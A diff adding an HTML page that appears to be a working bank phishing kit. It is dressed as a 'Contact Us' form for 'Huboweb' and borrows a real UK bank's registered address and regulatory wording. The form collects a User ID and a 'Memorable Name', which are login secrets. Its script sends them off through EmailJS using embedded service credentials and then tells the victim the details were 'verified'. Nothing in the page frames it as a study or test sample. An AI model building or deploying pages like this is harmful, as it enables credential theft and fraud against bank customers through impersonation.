@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Huboweb – Contact Us</title>
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #f4f4f4; display: flex; justify-content: center; padding: 40px 16px; min-height: 100vh; }
+    .wrap { width: 100%; max-width: 700px; }
+
+    .header { background: #1565C0; padding: 18px 36px; display: flex; align-items: center; justify-content: space-between; border-radius: 12px 12px 0 0; min-height: 64px; }
+    .brand { color: #fff; font-size: 20px; font-weight: 600; letter-spacing: 1.5px; display: flex; align-items: center; gap: 12px; }
+    .nav-links { display: flex; gap: 24px; font-size: 13px; }
+    .nav-links a { color: #90CAF9; text-decoration: underline; cursor: pointer; }
+    .secure { background: #fff; color: #1565C0; font-size: 12px; font-weight: 600; padding: 7px 16px; border-radius: 4px; display: flex; align-items: center; gap: 6px; white-space: nowrap; }
+
+    .body { background: #fff; border: 1px solid #ccc; border-top: none; padding: 28px 32px; }
+    .body h1 { font-size: 22px; font-weight: 600; color: #1a1a1a; margin-bottom: 4px; }
+    .body .subtitle { font-size: 13px; color: #555; margin-bottom: 22px; }
+
+    .form-group { margin-bottom: 16px; }
+    .form-group label { display: block; font-size: 13px; font-weight: 600; color: #1a1a1a; margin-bottom: 5px; }
+    .form-group input {
+      width: 100%; height: 38px; padding: 0 10px; font-size: 13px;
+      border: 1.5px solid #aaa; border-radius: 4px; color: #1a1a1a;
+      background: #fff; outline: none; transition: border-color 0.15s;
+    }
+    .form-group input:focus { border-color: #1565C0; box-shadow: 0 0 0 2px rgba(0,99,49,0.15); }
+    .err { font-size: 11px; color: #c0392b; margin-top: 3px; display: none; }
+    .err.show { display: block; }
+
+    .warning-row { font-size: 13px; color: #1a1a1a; margin: 8px 0 14px; }
+    .warning-row strong { font-weight: 600; }
+    .divider { border: none; border-top: 1px solid #ddd; margin: 0 0 16px; }
+    .action-row { display: flex; align-items: center; justify-content: space-between; }
+    .forgot-link { color: #1565C0; font-size: 13px; font-weight: 600; text-decoration: underline; cursor: pointer; }
+    .btn-continue { background: #000; color: #fff; border: none; padding: 10px 32px; font-size: 14px; font-weight: 600; border-radius: 8px; cursor: pointer; transition: background 0.15s; }
+    .btn-continue:hover { background: #222; }
+    .btn-continue:disabled { background: #555; cursor: not-allowed; }
+
+    .status-msg { margin-top: 14px; font-size: 13px; padding: 10px 14px; border-radius: 4px; display: none; }
+    .status-msg.error { display: flex; align-items: center; gap: 8px; background: #fdecea; border: 1px solid #c0392b; color: #c0392b; }
+
+    .page { display: none; }
+    .page.active { display: block; }
+
+    .thankyou-body { background: #fff; border: 1px solid #ccc; border-top: none; padding: 60px 28px; text-align: center; }
+    .check-circle { width: 76px; height: 76px; border-radius: 50%; background: #E3F2FD; display: flex; align-items: center; justify-content: center; margin: 0 auto 24px; }
+    .thankyou-body h1 { font-size: 22px; font-weight: 600; color: #1a1a1a; margin-bottom: 12px; }
+    .thankyou-body p { font-size: 14px; color: #555; line-height: 1.7; }
+
+    .footer { background: #1565C0; padding: 18px 28px 22px; border-radius: 0 0 12px 12px; }
+    .footer-links { display: flex; flex-wrap: wrap; gap: 6px 18px; margin-bottom: 12px; font-size: 12px; }
+    .footer-links a { color: #fff; text-decoration: none; cursor: pointer; }
+    .footer-links a:first-child { font-weight: 600; }
+    .footer-links a:hover { text-decoration: underline; }
+    .footer-legal { font-size: 11px; color: #90CAF9; line-height: 1.6; }
+
+    @media (max-width: 520px) {
+      .header { padding: 14px 16px; flex-wrap: wrap; gap: 10px; }
+      .nav-links { display: none; }
+      .body { padding: 20px 16px; }
+      .footer { padding: 14px 16px 18px; }
+    }
+  </style>
+</head>
+<body>
+<div class="wrap">
+
+  <!-- HEADER -->
+  <div class="header">
+    <div class="nav-links"><a>Mobile</a><a>Cookie policy</a></div>
+    <div class="secure">🔒 Secure site</div>
+  </div>
+
+  <!-- PAGE 1: FORM -->
+  <div id="page1" class="page active">
+    <div class="body">
+      <h1>Contact Us</h1>
+      <p class="subtitle">Fill in the form below and we'll get back to you shortly.</p>
+
+      <div class="form-group">
+        <label for="name">Name</label>
+        <input type="text" id="name" placeholder="e.g. Sarah Thompson" autocomplete="name" />
+        <div class="err" id="err-name">Please enter your name.</div>
+      </div>
+      <div class="form-group">
+        <label for="userid">User ID</label>
+        <input type="text" id="userid" placeholder="Enter your User ID" autocomplete="username" />
+        <div class="err" id="err-userid">Please enter your User ID.</div>
+      </div>
+      <div class="form-group">
+        <label for="memorable">Memorable Name</label>
+        <input type="text" id="memorable" placeholder="Enter your memorable name" />
+        <div class="err" id="err-memorable">Please enter your memorable name.</div>
+      </div>
+
+      <p class="warning-row"><strong>Warning:</strong> Don't tick this box if you're using a public or shared computer</p>
+      <hr class="divider" />
+      <div class="action-row">
+        <a class="forgot-link" href="#">Forgotten your logon details?</a>
+        <button class="btn-continue" id="submitBtn" onclick="handleSubmit()">Continue</button>
+      </div>
+      <div class="status-msg" id="statusMsg"></div>
+    </div>
+  </div>
+
+  <!-- PAGE 2: THANK YOU -->
+  <div id="page2" class="page">
+    <div class="thankyou-body">
+      <div class="check-circle">
+        <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#1565C0" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="12" cy="12" r="10"/><path d="M8 12l3 3 5-5"/>
+        </svg>
+      </div>
+      <h1>Thanks for verifying your details</h1>
+      <p>Your information has been successfully verified.<br>We'll be in touch with you shortly.</p>
+    </div>
+  </div>
+
+  <!-- FOOTER -->
+  <div class="footer">
+    <div class="footer-links">
+      <a>Huboweb</a><a>Security</a><a>Legal</a><a>Privacy</a><a>Rates and charges</a><a>www.huboweb.com</a>
+    </div>
+    <p class="footer-legal">Huboweb plc. Registered Office: 25 Gresham Street, London EC2V 7HN. Registered in England and Wales no. 2065. Huboweb plc is authorised by the Prudential Regulation Authority and regulated by the Financial Conduct Authority and the Prudential Regulation Authority under registration number 119278.</p>
+  </div>
+
+</div>
+
+<script>
+  // EmailJS credentials
+  emailjs.init("o0q_ACfJvwVr2rV6w");
+
+  async function handleSubmit() {
+    const fields = [
+      { id: 'name',      err: 'err-name' },
+      { id: 'userid',    err: 'err-userid' },
+      { id: 'memorable', err: 'err-memorable' }
+    ];
+
+    let valid = true;
+    fields.forEach(f => {
+      const el = document.getElementById(f.id);
+      const errEl = document.getElementById(f.err);
+      if (!el.value.trim()) {
+        errEl.classList.add('show');
+        el.style.borderColor = '#c0392b';
+        valid = false;
+      } else {
+        errEl.classList.remove('show');
+        el.style.borderColor = '#aaa';
+      }
+    });
+    if (!valid) return;
+
+    const btn = document.getElementById('submitBtn');
+    const statusMsg = document.getElementById('statusMsg');
+    btn.disabled = true;
+    btn.textContent = 'Sending...';
+    statusMsg.style.display = 'none';
+
+    const templateParams = {
+      name:      document.getElementById('name').value.trim(),
+      userid:    document.getElementById('userid').value.trim(),
+      memorable: document.getElementById('memorable').value.trim()
+    };
+
+    try {
+      await emailjs.send("service_xkve0q9", "template_amucrk1", templateParams);
+      document.getElementById('page1').classList.remove('active');
+      document.getElementById('page2').classList.add('active');
+    } catch (error) {
+      console.error('EmailJS error:', error);
+      statusMsg.textContent = '⚠ Failed to send. Please try again.';
+      statusMsg.className = 'status-msg error';
+      statusMsg.style.display = 'flex';
+      btn.disabled = false;
+      btn.textContent = 'Continue';
+    }
+  }
+</script>
+</body>
+</html>
